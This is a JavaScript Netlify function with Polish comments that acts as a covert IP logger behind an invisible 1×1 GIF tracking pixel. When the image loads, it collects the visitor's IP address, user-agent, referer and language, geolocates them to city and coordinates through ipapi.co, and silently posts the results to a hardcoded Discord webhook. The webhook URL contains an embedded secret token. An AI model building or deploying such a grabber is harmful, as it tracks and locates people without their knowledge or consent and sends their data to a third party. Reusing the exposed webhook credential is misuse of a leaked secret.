// netlify/functions/save-ip-txt.js

export default async (request) => {
  // Najlepsze sposoby pobrania prawdziwego IP na Netlify
  let ip = 
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    request.headers.get("cf-connecting-ip") ||
    request.headers.get("x-real-ip") ||
    "unknown";

  const ua = request.headers.get("user-agent") || "brak informacji";
  const referer = request.headers.get("referer") || "bezpośrednie wejście";
  const acceptLanguage = request.headers.get("accept-language") || "nieznane";
  const now = new Date().toISOString();

  // Dokładniejsza telemetria: Geolokacja IP (kraj, miasto, itd.) – używamy darmowego API
  let geoData = {
    country: "nieznany",
    region: "nieznany",
    city: "nieznany",
    isp: "nieznany",
    lat: "nieznany",
    lon: "nieznany",
  };

  try {
    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    if (geoResponse.ok) {
      const data = await geoResponse.json();
      geoData = {
        country: data.country_name || "nieznany",
        region: data.region || "nieznany",
        city: data.city || "nieznany",
        isp: data.org || "nieznany",
        lat: data.latitude || "nieznany",
        lon: data.longitude || "nieznany",
      };
    }
  } catch (e) {
    // Ignorujemy błędy – API może mieć limity
  }

  // Dodajemy inne informacje (innr – zakładam, że chodzi o inne dane jak referer, język, itp.)
  const txtContent = [
    `IP Logger - Zaawansowana Telemetria - ${now}`,
    "─────────────────────────────────────────",
    `Adres IP:      ${ip}`,
    `Kraj:          ${geoData.country}`,
    `Region:        ${geoData.region}`,
    `Miasto:        ${geoData.city}`,
    `ISP:           ${geoData.isp}`,
    `Szerokość geo: ${geoData.lat}`,
    `Długość geo:   ${geoData.lon}`,
    "─────────────────────────────────────────",
    `User-Agent:    ${ua}`,
    `Referer:       ${referer}`,
    `Język:         ${acceptLanguage}`,
    `Czas:          ${now}`,
    "─────────────────────────────────────────",
    "",
  ].join("\n");

  const webhook = "https://discord.com/api/webhooks/1460323910787530907/J0NXhcXMEpvHMYpKVwmH3ebjYXSitXJ-GX5N8ugXYq56hOTZre5unG6Uqqv329UhOHHp";

  const form = new FormData();
  form.append(
    "file",
    new Blob([txtContent], { type: "text/plain" }),
    `telemetria_${ip.replace(/\./g, "-")}_${Date.now()}.txt`
  );
  form.append("content", `Nowa telemetria z IP (${ip}) z kraju: ${geoData.country}`);

  // Wysyłamy – cicho ignorujemy błędy
  fetch(webhook, {
    method: "POST",
    body: form,
  }).catch(() => {});

  // Zwracamy niewidoczny 1×1 piksel GIF
  const transparentGif = Buffer.from(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
    "base64"
  );

  return new Response(transparentGif, {
    status: 200,
    headers: {
      "Content-Type": "image/gif",
      "Cache-Control": "no-store",
    },
  });
};
